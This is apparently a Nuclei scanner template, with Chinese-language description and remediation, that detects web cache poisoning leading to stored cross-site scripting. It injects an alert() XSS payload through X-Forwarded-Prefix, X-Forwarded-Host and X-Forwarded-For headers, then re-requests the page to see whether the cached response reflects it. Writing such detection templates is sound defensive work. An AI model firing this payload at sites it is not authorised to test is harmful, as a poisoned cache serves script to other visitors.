id: cache-poisoning-xss

info:
  name: Cache Poisoning - 存储型跨站脚本
  author: melbadry9,xelkomy,akincibor
  severity: high
  description: |
    该模板用于检测 Cache Poisoning - 存储型跨站脚本。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/?{变量}=1` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
    - https://portswigger.net/research/practical-web-cache-poisoning
    - https://portswigger.net/web-security/web-cache-poisoning
  classification:
    cwe-id: CWE-80
  metadata:
    max-request: 2
  tags: cache,generic,xss,vuln
variables:
  cache_key: "{{to_lower(rand_base(6))}}"
  cache_header: "{{to_lower(rand_base(6))}}"
  xss_payload: '"></script><script>alert(document.domain);</script>'

http:
  - raw:
      - |
        GET /?{{cache_key}}=1 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}
        X-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}
        X-Forwarded-For: {{cache_header}}.xff{{xss_payload}}
      - |
        GET /?{{cache_key}}=1 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - contains(body_2, cache_header)
          - contains(body_2, xss_payload)
        condition: and
